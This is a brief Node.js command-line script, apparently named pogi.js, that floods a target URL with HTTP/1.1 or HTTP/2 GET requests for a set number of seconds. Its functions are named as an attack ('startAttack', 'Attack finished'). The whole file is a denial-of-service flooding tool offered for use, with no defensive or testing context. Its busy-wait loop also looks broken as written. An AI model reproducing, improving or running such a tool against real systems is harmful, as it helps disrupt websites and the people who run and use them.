const http = require('http');
const http2 = require('http2');
const axios = require('axios');

function sendHttp1GetRequest(targetUrl) {
  axios.get(targetUrl)
    .then(response => {
      console.log(`HTTP/1.1 Status: ${response.status}`);
    })
    .catch(error => {
      console.error(`HTTP/1.1 Error: ${error.message}`);
    });
}

function sendHttp2GetRequest(targetUrl) {
  const client = http2.connect(targetUrl);

  client.on('error', (err) => console.error(`HTTP/2 Connection Error: ${err.message}`));

  const req = client.request({
    ':method': 'GET',
    ':path': '/',
  });

  req.setEncoding('utf8');
  req.end();

  req.on('response', (headers, flags) => {
    console.log('HTTP/2 Response:', headers[':status']);
  });

  req.on('error', (err) => {
    console.error(`HTTP/2 Error: ${err.message}`);
  });

  req.on('end', () => {
    client.close();
  });
}

function startAttack(targetUrl, duration, method) {
  const endTime = Date.now() + duration * 1000;

  const attackFunction = method === 'http1' ? sendHttp1GetRequest : sendHttp2GetRequest;

  while (Date.now() < endTime) {
    attackFunction(targetUrl);
  }

  console.log('Attack finished');
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const method = process.argv[4];

if (!targetUrl || !duration || !method) {
  console.log('Usage: node pogi.js <targetUrl> <durationInSeconds> <method (http1 or http2)>');
  process.exit(1);
}

startAttack(targetUrl, duration, method);
  
